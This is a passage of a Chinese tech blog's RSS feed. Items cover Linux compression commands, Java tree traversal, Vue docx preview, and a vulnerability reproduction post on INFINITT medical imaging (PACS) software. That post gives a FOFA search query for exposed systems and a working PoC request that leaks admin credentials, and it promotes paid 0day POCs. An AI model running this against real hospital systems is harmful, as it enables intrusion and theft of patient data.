实现效果 vue代码 &lt;el-dialog title"预览" :visible.sync"filePreview"&gt;&lt;div ref"file"&gt;&lt;/div&gt;&lt;/el-dialog&gt;引入依赖文件 官方文档地址 https://www.npmjs.com/package/docx-preview?activeTabre…阅读更多...SpringCloud Gateway保姆级入门教程什么是微服务网关 SpringCloud Gateway是Spring全家桶中一个比较新的项目&amp;#xff0c;Spring社区是这么介绍它的&amp;#xff1a; 该项目借助Spring WebFlux的能力&amp;#xff0c;打造了一个API网关。旨在提供一种简单而有效的方法来作为API服务的路由&amp;#xff0c;并为它们提供各种增强…阅读更多...uniapp配置微信小程序分包（分包优化）1.manifest.json中 
源码视图中找到mp-weixin&amp;#xff0c;新增代码"optimization":{"subPackages":true}&amp;#xff0c;如下图所示 "optimization" : {"subPackages" : true
} 
2.pages.json中 
分包内静态文件示例 
"subPackages&amp;…阅读更多...利用mydumper从MySQL迁移数据到OceanBase数据库命令记录一&amp;#xff1a;中转服务器环境准备 
1、下载安装包。 
请根据需要在 下载安装包 中&amp;#xff0c;下载对应的安装包并安装。 
2、在数据库主机上解压缩安装包。 
以 mydumper-0.12.7-2-zstd.el7.x86_64.rpm 为示例。 
rpm2cpio mydumper-0.12.7-2-zstd.el7.x86_64.rpm | cpio -di…阅读更多...Redis 一些问题关闭Linux防火墙 
找到redis 配置文件 注释  #bind 127.0.0.1 
修改 protected-mode  yes    改为no 如果报&amp;#xff1a;NOAUTH Authentication required错误就是设置了密码 
auth 你的密码 配置Redis 
spring.redis.host192.168.44.132 
spring.redis.port6379
spring.redis.d…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:09 +0000</pubDate>
    </item>
    <item>
      <title>「漏洞复现」英飞达医学影像存档与通信系统 WebUserLogin.asmx 信息泄露漏洞</title>
      <link>https://www.ppmy.cn/news/1540893.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维「漏洞复现」英飞达医学影像存档与通信系统 WebUserLogin.asmx 信息泄露漏洞news/2025/10/31 23:19:08/0x01免责声明请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！0x02产品介绍英飞达医学影像存档与通信系统 Picture Archiving and Communication System，它是应用在医院影像科室的系统，主要的任务就是把日常产生的各种医学影像（包括核磁，CT，超声，各种X光机，各种红外仪、显微仪等设备产生的图像）通过各种接口（模拟，DICOM，网络）以数字化的方式海量保存起来，当需要的时候在一定的授权下能够很快的调回使用，同时增加一些辅助诊断管理功能。它在各种影像设备间传输数据和组织存储数据具有重要作用。0x03漏洞威胁英飞达医学影像存档与通信系统 WebUserLogin.asmx 接口存在信息泄露漏洞，未经身份攻击者可通过该漏洞获取系统后台管理员账户密码信息，登录后台，导致系统处于极不安全的状态。0x04漏洞环境FOFA:"INFINITT" &amp;&amp; (icon_hash="1474455751" || icon_hash="702238928")0x05漏洞复现PoCGET /webservices/WebUserLogin.asmx/GetUserInfoByUserID?userID=admin HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Connection: keep-alive尝试登录0x06批量脚本验证Nuclei验证脚本已发布知识星球：冷漠安全0x07修复建议关闭互联网暴露面或接口设置访问权限关注厂商及时更新补丁或升级至安全版本https://www.infinitt.vip/icnweb/0x08加入我们漏洞详情及批量检测POC工具请前往知识星球获取知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等「星球介绍」：本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。「星球服务」：加入星球，你会获得：♦ 批量验证漏洞POC脚本♦ 0day、1day分享♦ 汇集其它付费星球资源分享♦ 大量的红蓝对抗实战资源♦ 优秀的内部红蓝工具及插件♦ 综合类别优秀Wiki文库及漏洞库♦ 提问及技术交流http://www.ppmy.cn/news/1540893.html相关文章Linux下压缩与解压缩命令大全【详解】&amp;#x1f468;‍&amp;#x1f393;博主简介 &amp;#x1f3c5;CSDN博客专家   &amp;#x1f3c5;云计算领域优质创作者   &amp;#x1f3c5;华为云开发者社区专家博主   &amp;#x1f3c5;阿里云开发者社区专家博主 &amp;#x1f48a;交流社区&amp;#xff1a;运维交流社区 欢迎大家的加入&amp;#xff01…阅读更多...二叉树算法之二叉树遍历（前序、中序、后序、层次遍历）二叉树遍历是指按照某种顺序访问二叉树的所有节点。常见的二叉树遍历方式包括前序遍历&amp;#xff08;Preorder Traversal&amp;#xff09;、中序遍历&amp;#xff08;Inorder Traversal&amp;#xff09;、后序遍历&amp;#xff08;Postorder Traversal&amp;#xff09;和层次遍历&amp;#xff08;Level-or…阅读更多...Vue前端预览docx文档Vue前端预览docx文档 
实现效果 vue代码 &lt;el-dialog title"预览" :visible.sync"filePreview"&gt;&lt;div ref"file"&gt;&lt;/div&gt;&lt;/el-dialog&gt;引入依赖文件 官方文档地址 https://www.npmjs.com/package/docx-preview?activeTabre…阅读更多...SpringCloud Gateway保姆级入门教程什么是微服务网关 SpringCloud Gateway是Spring全家桶中一个比较新的项目&amp;#xff0c;Spring社区是这么介绍它的&amp;#xff1a; 该项目借助Spring WebFlux的能力&amp;#xff0c;打造了一个API网关。旨在提供一种简单而有效的方法来作为API服务的路由&amp;#xff0c;并为它们提供各种增强…阅读更多...uniapp配置微信小程序分包（分包优化）1.manifest.json中 
源码视图中找到mp-weixin&amp;#xff0c;新增代码"optimization":{"subPackages":true}&amp;#xff0c;如下图所示 "optimization" : {"subPackages" : true
} 
2.pages.json中 
分包内静态文件示例 
"subPackages&amp;…阅读更多...利用mydumper从MySQL迁移数据到OceanBase数据库命令记录一&amp;#xff1a;中转服务器环境准备 
1、下载安装包。 
请根据需要在 下载安装包 中&amp;#xff0c;下载对应的安装包并安装。 
2、在数据库主机上解压缩安装包。 
以 mydumper-0.12.7-2-zstd.el7.x86_64.rpm 为示例。 
rpm2cpio mydumper-0.12.7-2-zstd.el7.x86_64.rpm | cpio -di…阅读更多...Redis 一些问题关闭Linux防火墙 
找到redis 配置文件 注释  #bind 127.0.0.1 
修改 protected-mode  yes    改为no 如果报&amp;#xff1a;NOAUTH Authentication required错误就是设置了密码 
auth 你的密码 配置Redis 
spring.redis.host192.168.44.132 
spring.redis.port6379
spring.redis.d…阅读更多...如何从小白成长为大神大学新生编程入门攻略&amp;#xff1a;如何从小白成长为大神 
编程已成为当代大学生的重要技能&amp;#xff0c;但面对众多编程语言和学习资源&amp;#xff0c;新生们常常感到迷茫。以下是大学新生入门编程的最佳路径&amp;#xff0c;助你打下坚实的基础&amp;#xff0c;推动未来职业发展。 
方向一…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:08 +0000</pubDate>
    </item>
    <item>
      <title>Linux下压缩与解压缩命令大全【详解】</title>
      <link>https://www.ppmy.cn/news/1540892.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Linux下压缩与解压缩命令大全【详解】news/2025/10/31 23:19:07/👨‍🎓博主简介🏅CSDN博客专家🏅云计算领域优质创作者🏅华为云开发者社区专家博主🏅阿里云开发者社区专家博主💊交流社区：运维交流社区 欢迎大家的加入！🐋 希望大家多多支持，我们一起进步！😄🎉如果文章对你有帮助的话，欢迎 点赞 👍🏻 评论 💬 收藏 ⭐️ 加关注+💗文章目录linux常用的解压和压缩命令如下：.zip或.zipx.rar.tar.gz或tar.gz或.tgz.Z或.tar.Z.bz或.tar.bz或.bz2或.tar.bz2.xz或tar.xz.lha.deb.rpm.7z拓展总结：参考文献：linux常用的解压和压缩命令如下：.zip或.zipx压缩文件.zip、.zipx：都可以使用zip、unzip命令。例如，要将目录/home/mydata压缩成一个文件mydata.zip，可以使用以下命令：zip -r mydata.zip /home/mydata/要解压缩.zip或.zipx文件，都可以使用unzip命令：unzipmydata.zipunzipmydata.zipx注：下载zip（压缩）、unzip（解压缩）命令【centos为例】：sudoyuminstallzipsudoyuminstallunzip更多分片信息等可查看：Linux上实现分片压缩及解压分片zip压缩包 - 及zip、unzip命令详解.rar压缩文件.rar：例如，要将目录/home/mydata压缩成一个文件mydata.rar，可以使用以下rar a命令：rara mydata.rar /home/mydata/要解压缩.rar文件，可以使用以下unrar x命令：unrarx mydata.rar确认压缩包文件是否损坏：unrart File.rar注：rar命令下载，比如centos系统可以使用wget下载：#下载rar程序包。wgethttp://www.rarlab.com/rar/rarlinux-x64-5.6.0.tar.gz#解压rar组件包。tar-zxvf rarlinux-x64-5.6.0.tar.gz#进入解压出的"rar"文件夹。cdrar#进行配置。配置成功后，就可以使用rar命令解压rar压缩包了。make.tar压缩文件.tar：例如，要将目录/home/mydata压缩成一个文件mydata.tar，可以使用以下tar cvf命令：# v展示详细信息tarcvf mydata.tar /home/mydata/tarcf mydata.tar /home/mydata/要解压缩.tar文件，可以使用以下tar xvf命令：tarxvf mydata.tartarxf mydata.tar# 指定路径tarxf mydata.tar -C /home/a/.gz或tar.gz或.tgz压缩文件.gz、.tar.gz或.tgz：都可以使用tar czvf命令压缩。例如，要将目录/home/mydata压缩成一个文件mydata.tar.gz，可以使用以下命令：tarczvf mydata.tar.gz /home/mydata/tarczf mydata.tar.gz /home/mydata/要解压缩.gz、.tar.gz或.tgz文件，都可以使用以下tar xzvf命令：tarxzvf mydata.tar.gztarzxf mydata.tar.gz# 指定路径tarzxf mydata.tar.gz -C /home/a/.Z或.tar.Z压缩文件.Z或.tar.Z：都可以使用tar czvf命令压缩。例如，要将目录/home/mydata压缩成一个文件mydata.tar.Z，可以使用以下命令：tarczvf mydata.tar.Z /home/mydata/要解压缩.Z或.tar.Z文件，都可以使用以下tar xzvf命令：tarxzvf mydata.tar.Z.bz或.tar.bz或.bz2或.tar.bz2压缩文件.bz、.tar.bz或.bz2、.tar.bz2：都可以使用tar cjvf命令压缩。例如，要将目录/home/mydata压缩成一个文件mydata.tar.bz2，可以使用以下命令：tarcjvf mydata.tar.bz2 /home/mydata/要解压缩.bz、.tar.bz或.bz2、.tar.bz2文件，都可以使用以下tar xjvf命令：tarxjvf mydata.tar.bz2.xz或tar.xz压缩文件.xz、.tar.xz：都可以使用tar cjvf命令压缩。例如，要将目录/home/mydata压缩成一个文件mydata.tar.xz，可以使用以下命令：tarcjvf mydata.tar.xz /home/mydata/要解压缩.xz、.tar.xz文件，都可以使用以下tar xjvf命令：tarxjvf mydata.tar.xz.lha压缩文件.lha：例如，要将目录/home/mydata压缩成一个文件mydata.lha，可以使用以下lha a命令：lha a mydata.lha /home/mydata/要解压缩.lha文件，可以使用以下lha x命令：lha x mydata.lha注：如果没有lha命令，可以使用yum下载如下（需要yum扩展源）：centos7为例，扩展源地址下载：wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.reposudoyuminstalllhasa.deb压缩文件.deb：例如，要将软件myapp打包成一个文件myapp.deb，可以使用以下dpkg-deb --build命令：dpkg-deb --build myapp要安装.deb文件，可以使用以下dpkg -i命令：dpkg -i myapp.deb注：如果没有dpkg命令，可以使用yum下载如下（需要yum扩展源）：centos7为例，扩展源地址下载：wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.reposudoyuminstalldpkg.rpm压缩文件.rpm：例如，要将软件myapp打包成一个文件myapp.rpm，可以使用以下rpm -ba命令：rpm-ba myapp.spec要安装.rpm文件，可以使用以下rpm -i命令：rpm-ivh myapp.rpm或者将目录打成一个rpm包可参考：Linux如何将文件或目录打成rpm包？ – fpm打包详解.7z压缩文件.7z：例如，要将目录/home/mydata压缩成一个文件mydata.7z，可以使用以下7z a命令：7z a mydata.7z /home/mydata/要解压缩.7z文件，可以使用以下7z x命令：7z x mydata.7z注：如果没有7z命令，可以使用yum下载如下（需要yum扩展源）：centos7为例，扩展源地址下载：wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.reposudoyuminstallp7zip拓展总结：在使用tar命令，去解压所有支持tar命令解压缩的类型文件时（.tar、.gz、tar.gz或.tgz、.Z、.tar.Z、.bz、.tar.bz、.bz2、.tar.bz2、.xz、tar.xz），不需要在文件名后面添加解压目录，tar命令会自动解压到当前目录。如果需要指定解压缩目录，都可以使用-C参数，例如：tarxzvf file.tar.gz -C /home/a/参考文献：参考文章标题参考文章连接Linux下解压和压缩命令大全（详解+案例）https://blog.csdn.net/Da_zhenzai/article/details/130400758http://www.ppmy.cn/news/1540892.html相关文章二叉树算法之二叉树遍历（前序、中序、后序、层次遍历）二叉树遍历是指按照某种顺序访问二叉树的所有节点。常见的二叉树遍历方式包括前序遍历&amp;#xff08;Preorder Traversal&amp;#xff09;、中序遍历&amp;#xff08;Inorder Traversal&amp;#xff09;、后序遍历&amp;#xff08;Postorder Traversal&amp;#xff09;和层次遍历&amp;#xff08;Level-or…阅读更多...Vue前端预览docx文档Vue前端预览docx文档 
实现效果 vue代码 &lt;el-dialog title"预览" :visible.sync"filePreview"&gt;&lt;div ref"file"&gt;&lt;/div&gt;&lt;/el-dialog&gt;引入依赖文件 官方文档地址 https://www.npmjs.com/package/docx-preview?activeTabre…阅读更多...SpringCloud Gateway保姆级入门教程什么是微服务网关 SpringCloud Gateway是Spring全家桶中一个比较新的项目&amp;#xff0c;Spring社区是这么介绍它的&amp;#xff1a; 该项目借助Spring WebFlux的能力&amp;#xff0c;打造了一个API网关。旨在提供一种简单而有效的方法来作为API服务的路由&amp;#xff0c;并为它们提供各种增强…阅读更多...uniapp配置微信小程序分包（分包优化）1.manifest.json中 
源码视图中找到mp-weixin&amp;#xff0c;新增代码"optimization":{"subPackages":true}&amp;#xff0c;如下图所示 "optimization" : {"subPackages" : true
} 
2.pages.json中 
分包内静态文件示例 
"subPackages&amp;…阅读更多...利用mydumper从MySQL迁移数据到OceanBase数据库命令记录一&amp;#xff1a;中转服务器环境准备 
1、下载安装包。 
请根据需要在 下载安装包 中&amp;#xff0c;下载对应的安装包并安装。 
2、在数据库主机上解压缩安装包。 
以 mydumper-0.12.7-2-zstd.el7.x86_64.rpm 为示例。 
rpm2cpio mydumper-0.12.7-2-zstd.el7.x86_64.rpm | cpio -di…阅读更多...Redis 一些问题关闭Linux防火墙 
找到redis 配置文件 注释  #bind 127.0.0.1 
修改 protected-mode  yes    改为no 如果报&amp;#xff1a;NOAUTH Authentication required错误就是设置了密码 
auth 你的密码 配置Redis 
spring.redis.host192.168.44.132 
spring.redis.port6379
spring.redis.d…阅读更多...如何从小白成长为大神大学新生编程入门攻略&amp;#xff1a;如何从小白成长为大神 
编程已成为当代大学生的重要技能&amp;#xff0c;但面对众多编程语言和学习资源&amp;#xff0c;新生们常常感到迷茫。以下是大学新生入门编程的最佳路径&amp;#xff0c;助你打下坚实的基础&amp;#xff0c;推动未来职业发展。 
方向一…阅读更多...灵当CRM index.php 任意文件上传漏洞复现0x01 产品描述&amp;#xff1a; 灵当CRM是一款专为中小企业量身定制的智能客户关系管理工具&amp;#xff0c;由上海灵当信息科技有限公司开发和运营。该系统广泛应用于多个行业&amp;#xff0c;包括金融、教育、医疗、IT服务及房地产等领域&amp;#xff0c;旨在满足企业对客户个性化管理的需求&amp;…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:07 +0000</pubDate>
    </item>
    <item>
      <title>二叉树算法之二叉树遍历（前序、中序、后序、层次遍历）</title>
      <link>https://www.ppmy.cn/news/1540891.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维二叉树算法之二叉树遍历（前序、中序、后序、层次遍历）news/2025/10/31 23:19:06/二叉树遍历是指按照某种顺序访问二叉树的所有节点。常见的二叉树遍历方式包括前序遍历（Preorder Traversal）、中序遍历（Inorder Traversal）、后序遍历（Postorder Traversal）和层次遍历（Level-order Traversal）。不同的遍历方式有不同的应用场景，下面我们详细介绍这几种遍历方式及其实现。1. 前序遍历（Preorder Traversal）在前序遍历中，按照“根节点 -&gt; 左子树 -&gt; 右子树”的顺序遍历二叉树的节点。即：首先访问根节点，然后递归地遍历左子树，最后递归地遍历右子树。前序遍历的顺序：当前节点 -&gt; 左子节点 -&gt; 右子节点前序遍历的递归实现：// 定义二叉树节点
class TreeNode {int val;TreeNode left, right;TreeNode(int val) {this.val = val;this.left = this.right = null;}
}public class BinaryTreeTraversal {// 前序遍历 - 递归实现public void preorder(TreeNode root) {if (root == null) {return;}System.out.print(root.val + " ");  // 访问根节点preorder(root.left);  // 递归遍历左子树preorder(root.right);  // 递归遍历右子树}
}前序遍历的非递归实现：可以用栈模拟递归的过程，先访问根节点，然后将右子树和左子树依次压栈，确保左子树先被遍历。import java.util.Stack;public class BinaryTreeTraversal {// 前序遍历 - 非递归实现public void preorderIterative(TreeNode root) {if (root == null) {return;}Stack&lt;TreeNode&gt; stack = new Stack&lt;&gt;();stack.push(root);while (!stack.isEmpty()) {TreeNode node = stack.pop();System.out.print(node.val + " ");  // 访问根节点if (node.right != null) {stack.push(node.right);  // 右子树入栈}if (node.left != null) {stack.push(node.left);  // 左子树入栈}}}
}2. 中序遍历（Inorder Traversal）在中序遍历中，按照“左子树 -&gt; 根节点 -&gt; 右子树”的顺序遍历二叉树的节点。即：首先递归地遍历左子树，然后访问根节点，最后递归地遍历右子树。中序遍历的顺序：左子节点 -&gt; 当前节点 -&gt; 右子节点中序遍历的递归实现：public class BinaryTreeTraversal {// 中序遍历 - 递归实现public void inorder(TreeNode root) {if (root == null) {return;}inorder(root.left);  // 递归遍历左子树System.out.print(root.val + " ");  // 访问根节点inorder(root.right);  // 递归遍历右子树}
}中序遍历的非递归实现：同样可以使用栈来实现，先遍历到最左边的节点，然后逐步回溯访问根节点，最后遍历右子树。import java.util.Stack;public class BinaryTreeTraversal {// 中序遍历 - 非递归实现public void inorderIterative(TreeNode root) {Stack&lt;TreeNode&gt; stack = new Stack&lt;&gt;();TreeNode curr = root;while (curr != null || !stack.isEmpty()) {while (curr != null) {stack.push(curr);  // 左子树入栈curr = curr.left;}curr = stack.pop();  // 弹出栈顶节点并访问System.out.print(curr.val + " ");curr = curr.right;  // 遍历右子树}}
}3. 后序遍历（Postorder Traversal）在后序遍历中，按照“左子树 -&gt; 右子树 -&gt; 根节点”的顺序遍历二叉树的节点。即：首先递归地遍历左子树，然后递归地遍历右子树，最后访问根节点。后序遍历的顺序：左子节点 -&gt; 右子节点 -&gt; 当前节点后序遍历的递归实现：public class BinaryTreeTraversal {// 后序遍历 - 递归实现public void postorder(TreeNode root) {if (root == null) {return;}postorder(root.left);  // 递归遍历左子树postorder(root.right);  // 递归遍历右子树System.out.print(root.val + " ");  // 访问根节点}
}后序遍历的非递归实现：后序遍历较复杂，需要两个栈，一个用于模拟递归，另一个用于输出结果。import java.util.Stack;public class BinaryTreeTraversal {// 后序遍历 - 非递归实现public void postorderIterative(TreeNode root) {if (root == null) {return;}Stack&lt;TreeNode&gt; stack = new Stack&lt;&gt;();Stack&lt;TreeNode&gt; output = new Stack&lt;&gt;();stack.push(root);while (!stack.isEmpty()) {TreeNode node = stack.pop();output.push(node);if (node.left != null) {stack.push(node.left);  // 左子树入栈}if (node.right != null) {stack.push(node.right);  // 右子树入栈}}while (!output.isEmpty()) {System.out.print(output.pop().val + " ");  // 输出结果}}
}4. 层次遍历（Level-order Traversal）层次遍历是按照每一层节点的顺序从上到下，从左到右依次遍历二叉树的节点。可以通过队列实现，每次从队列中取出一个节点，然后将其左右子节点依次加入队列。层次遍历的顺序：按照从上到下、从左到右的层次顺序遍历节点层次遍历的实现：import java.util.LinkedList;
import java.util.Queue;public class BinaryTreeTraversal {// 层次遍历 - 使用队列实现public void levelOrder(TreeNode root) {if (root == null) {return;}Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;();queue.offer(root);while (!queue.isEmpty()) {TreeNode node = queue.poll();System.out.print(node.val + " ");  // 访问当前节点if (node.left != null) {queue.offer(node.left);  // 左子节点入队}if (node.right != null) {queue.offer(node.right);  // 右子节点入队}}}
}四种遍历的总结前序遍历（Preorder Traversal）：根 -&gt; 左 -&gt; 右，通常用于复制树。中序遍历（Inorder Traversal）：左 -&gt; 根 -&gt; 右，通常用于输出升序排序（对二叉搜索树）。后序遍历（Postorder Traversal）：左 -&gt; 右 -&gt; 根，通常用于删除树或者计算子树的大小。层次遍历（Level-order Traversal）：按层次顺序遍历，常用于广度优先搜索。这些遍历方式各有特点，应用于不同的场景。http://www.ppmy.cn/news/1540891.html相关文章Vue前端预览docx文档Vue前端预览docx文档 
实现效果 vue代码 &lt;el-dialog title"预览" :visible.sync"filePreview"&gt;&lt;div ref"file"&gt;&lt;/div&gt;&lt;/el-dialog&gt;引入依赖文件 官方文档地址 https://www.npmjs.com/package/docx-preview?activeTabre…阅读更多...SpringCloud Gateway保姆级入门教程什么是微服务网关 SpringCloud Gateway是Spring全家桶中一个比较新的项目&amp;#xff0c;Spring社区是这么介绍它的&amp;#xff1a; 该项目借助Spring WebFlux的能力&amp;#xff0c;打造了一个API网关。旨在提供一种简单而有效的方法来作为API服务的路由&amp;#xff0c;并为它们提供各种增强…阅读更多...uniapp配置微信小程序分包（分包优化）1.manifest.json中 
源码视图中找到mp-weixin&amp;#xff0c;新增代码"optimization":{"subPackages":true}&amp;#xff0c;如下图所示 "optimization" : {"subPackages" : true
} 
2.pages.json中 
分包内静态文件示例 
"subPackages&amp;…阅读更多...利用mydumper从MySQL迁移数据到OceanBase数据库命令记录一&amp;#xff1a;中转服务器环境准备 
1、下载安装包。 
请根据需要在 下载安装包 中&amp;#xff0c;下载对应的安装包并安装。 
2、在数据库主机上解压缩安装包。 
以 mydumper-0.12.7-2-zstd.el7.x86_64.rpm 为示例。 
rpm2cpio mydumper-0.12.7-2-zstd.el7.x86_64.rpm | cpio -di…阅读更多...Redis 一些问题关闭Linux防火墙 
找到redis 配置文件 注释  #bind 127.0.0.1 
修改 protected-mode  yes    改为no 如果报&amp;#xff1a;NOAUTH Authentication required错误就是设置了密码 
auth 你的密码 配置Redis 
spring.redis.host192.168.44.132 
spring.redis.port6379
spring.redis.d…阅读更多...如何从小白成长为大神大学新生编程入门攻略&amp;#xff1a;如何从小白成长为大神 
编程已成为当代大学生的重要技能&amp;#xff0c;但面对众多编程语言和学习资源&amp;#xff0c;新生们常常感到迷茫。以下是大学新生入门编程的最佳路径&amp;#xff0c;助你打下坚实的基础&amp;#xff0c;推动未来职业发展。 
方向一…阅读更多...灵当CRM index.php 任意文件上传漏洞复现0x01 产品描述&amp;#xff1a; 灵当CRM是一款专为中小企业量身定制的智能客户关系管理工具&amp;#xff0c;由上海灵当信息科技有限公司开发和运营。该系统广泛应用于多个行业&amp;#xff0c;包括金融、教育、医疗、IT服务及房地产等领域&amp;#xff0c;旨在满足企业对客户个性化管理的需求&amp;…阅读更多...除GOF23种设计模式之简单工厂模式文章目录 1. 简介2. 代码2.1 抽象类&amp;#xff1a;Course.java2.2 产品A:JavaCourse.java2.3 产品B:PythonCourse.java2.4 工厂:CourseFactory.java2.5 测试&amp;#xff1a;Test.java 3. 心得参考链接&amp;#xff08;无&amp;#xff09; 1. 简介 
简单工厂模式(Simple Factory Patern):又称…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:06 +0000</pubDate>
    </item>
    <item>
      <title>Vue前端预览docx文档</title>
      <link>https://www.ppmy.cn/news/1540890.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Vue前端预览docx文档news/2025/10/31 23:19:05/Vue前端预览docx文档实现效果vue代码&lt;el-dialog title="预览" :visible.sync="filePreview"&gt;&lt;div ref="file"&gt;&lt;/div&gt;&lt;/el-dialog&gt;引入依赖文件官方文档地址https://www.npmjs.com/package/docx-preview?activeTab=readme下载docx-preview
npm install docx-preview或者本地引入
文件下载地址：https://github.com/VolodymyrBaydalka/docxjs#readme&lt;!--lib uses jszip 这个是docx引用的包--&gt;
&lt;script src="https://unpkg.com/jszip/dist/jszip.min.js"&gt;&lt;/script&gt;
&lt;script src="docx-preview.min.js"&gt;&lt;/script&gt;获取二进制流，并渲染到页面上axios({method: "get",responseType: "blob", // 因为是流文件，所以要指定blob类型url: row.url, // 自己的服务器，提供的一个word下载文件接口}).then(({ data }) =&gt; {docx.renderAsync(data, this.$refs.file); // 渲染到页面});http://www.ppmy.cn/news/1540890.html相关文章SpringCloud Gateway保姆级入门教程什么是微服务网关 SpringCloud Gateway是Spring全家桶中一个比较新的项目&amp;#xff0c;Spring社区是这么介绍它的&amp;#xff1a; 该项目借助Spring WebFlux的能力&amp;#xff0c;打造了一个API网关。旨在提供一种简单而有效的方法来作为API服务的路由&amp;#xff0c;并为它们提供各种增强…阅读更多...uniapp配置微信小程序分包（分包优化）1.manifest.json中 
源码视图中找到mp-weixin&amp;#xff0c;新增代码"optimization":{"subPackages":true}&amp;#xff0c;如下图所示 "optimization" : {"subPackages" : true
} 
2.pages.json中 
分包内静态文件示例 
"subPackages&amp;…阅读更多...利用mydumper从MySQL迁移数据到OceanBase数据库命令记录一&amp;#xff1a;中转服务器环境准备 
1、下载安装包。 
